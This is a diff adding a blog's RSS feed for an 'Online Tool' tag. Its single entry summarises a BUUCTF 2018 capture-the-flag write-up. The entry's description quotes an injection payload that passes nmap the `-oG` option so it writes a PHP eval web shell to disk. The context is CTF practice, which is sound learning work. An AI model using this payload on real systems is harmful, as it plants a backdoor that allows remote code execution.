@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Online Tool on 路人枭的博客</title>
+    <link>https://lurenxiao1998.github.io/zh/tags/online-tool/</link>
+    <description>Recent content in Online Tool on 路人枭的博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh</language>
+    <managingEditor>lurenxiao98@gmail.com (Lurenxiao)</managingEditor>
+    <webMaster>lurenxiao98@gmail.com (Lurenxiao)</webMaster>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Mon, 20 Jan 2020 18:27:00 +0900</lastBuildDate>
+    
+        <atom:link href="https://lurenxiao1998.github.io/zh/tags/online-tool/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>[BUUCTF 2018]Online Tool</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/buuctf-2018online-tool/</link>
+        <pubDate>Mon, 20 Jan 2020 18:27:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 18:27:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/buuctf-2018online-tool/</guid>
+        <description>知识点 https://paper.seebug.org/164/ payload 1 &amp;#39; &amp;lt;?php @eval(\$_POST[\&amp;#34;hack\&amp;#34;]);?&amp;gt; -oG hack.php &amp;#39;</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Online Tool</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
